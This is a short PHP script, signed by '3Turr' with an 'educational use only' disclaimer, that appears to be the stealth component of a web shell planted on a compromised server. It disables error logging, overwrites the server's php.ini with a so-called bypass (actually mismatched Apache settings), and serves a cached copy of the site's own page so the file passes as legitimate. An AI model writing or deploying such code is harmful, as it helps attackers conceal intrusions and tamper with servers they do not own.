<?php
/*
Coded by 3Turr
I do not take any responsibility for any damage caused through this project, This is only for educational use only.

*/
@set_time_limit(0); 
ini_set('memory_limit', '-1');
@ini_set('max_execution_time', 0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@set_magic_quotes_runtime(0);

function p404curl($url){
	$ch = curl_init();      
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
        return curl_exec($ch);
}

$bypass = 
"<IfModule mpm_event_module>
StartServers 6
MinSpareThreads 32
MaxSpareThreads 128
ThreadsPerChild 64
ServerLimit 16
MaxRequestWorkers 1024
MaxConnectionsPerChild 10000
</IfModule>
";
file_put_contents('php.ini',$bypass);

if (strtolower(substr(PHP_OS,0,3))=="win")
    $sys='win';
 else
    $sys='unix';

$me = basename(__FILE__ );
$uul = $_SERVER['PHP_SELF'];
$uul= 'http://'.$_SERVER['HTTP_HOST'].$uul;
$uul1 = $_SERVER['REQUEST_URI'];
$d404 = '3Turr';
if ($sys == 'win'){
	if (!isset($_SESSION['hidden']) || !file_exists('C:\\Users\\Default\\AppData\\Local\\Temp\\'.md5($uul1))){
		$p404 = p404curl($uul) or $d404;
		file_put_contents("C:\\Users\\Default\\AppData\\Local\\Temp\\".md5($uul1),$p404);
		$_SESSION['hidden'] = md5($uul1);
	}else{
		$p404 = file_get_contents('C:\\Users\\Default\\AppData\\Local\\Temp\\'.md5($uul1));
	}
}else{
	if (!isset($_SESSION['hidden']) || !file_exists('/tmp/'.md5($uul1))){
		$p404 = p404curl($uul) or $d404;
		file_put_contents('/tmp/'.md5($uul1),$p404);
		$_SESSION['hidden'] = md5($uul1);
		
	}else{
		$p404 = file_get_contents('/tmp/'.md5($uul1));
		
	}
}

echo $p404;
	die();